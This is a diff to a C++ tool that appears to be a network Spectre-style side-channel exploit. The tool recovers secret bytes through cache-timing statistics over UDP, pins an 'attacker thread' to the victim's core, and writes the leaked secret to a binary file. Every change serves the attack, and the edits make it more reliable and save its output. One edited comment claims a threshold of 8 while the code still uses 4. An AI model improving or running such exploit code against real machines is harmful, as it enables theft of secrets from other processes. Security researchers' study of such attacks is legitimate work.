@@ -15,6 +15,8 @@
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <sstream>
+#include <iomanip>
 #include <thread>
 #include <mutex>
 #include <chrono>
@@ -632,8 +634,8 @@ void send_worker_v2(uint16_t port) {
       // - TODO: this does not handle dropped packets (i.e. a real external server)
       // -- Linux tends to guarantee in-oder and sucessful delivery for localhost
       msg& m = reinterpret_cast<msg&>(buf);
-      // Wait for confirmation of malicious_x:
       for (;;) {
+        // Wait for confirmation of malicious_x:
         auto bytes = s.recv(buf, sizeof(buf));  // TODO: Replace me with recvmmsg!
         if (bytes == sizeof(msg)) {
           if (m.x == malicious_x) {
@@ -709,7 +711,7 @@ void send_worker_v2(uint16_t port) {
     const auto best = counts.at(counts_idx[0]);   // best
     const auto second = counts.at(counts_idx[1]); // second best
 
-    // Is there only one contender?  (picked min threshold 4, out of a hat)
+    // Is there only one contender?  (picked min threshold 8, out of a hat)
     bool single_contender = sum == best && sum >= 4;
     // Is there a majority leader?  (picked signal threshold 2x, out of a hat)
     bool significant = best >= (second/2) && sum >= 64;
@@ -747,7 +749,9 @@ void send_worker_v2(uint16_t port) {
       // Output statistics:
       float confidence = (float(best) / float(sum)) * 100;
       float observability = (float(best) / measurements) * 100;
-      std::cout << "Offset["<<malicious_x<<"] (" << idx << " : "
+      std::stringstream idx_hex;
+      idx_hex << std::hex << std::setw(2) << idx;
+      std::cout << "Offset["<<malicious_x<<"] (0x" << idx_hex.str() << " : "
                 << static_cast<char>(idx) << "): "
                 << best << '/' << sum << " hits with confidence "
                 << confidence << "%.\n";
@@ -810,21 +814,26 @@ int main(int argc, char* const argv[]) {
   std::thread t(send_worker_v2, udp_port);
 
   // Pin attacker thread to the same core as victim (optional):
-//  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
-//  if (rc != 0) {
-//    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
-//  }
+  // - Help prevent kernel scheduler from messing up cache locality between runs
+  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
+  if (rc != 0) {
+    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
+  }
   t.join(); // wait until exits for now...
 
 
   // Save discovered secret to file:
-  assert (secret.size() > 0);
+  assert(secret.size() > 0);
+  std::stringstream fn_ss;
+  fn_ss << "secret." << target_x_offset << ".bin";
+
   std::ofstream f;
-  f.open("secret.out", std::ios::out);
+  f.open(fn_ss.str(), std::ios::out|std::ios::binary);
   if (!f.is_open()) {
     std::cerr << "Error opening file for writing...";
   }
-  f << secret;
+//  f << secret;
+  f.write(secret.c_str(), secret.size());
   f.close();
 
   return EXIT_SUCCESS;
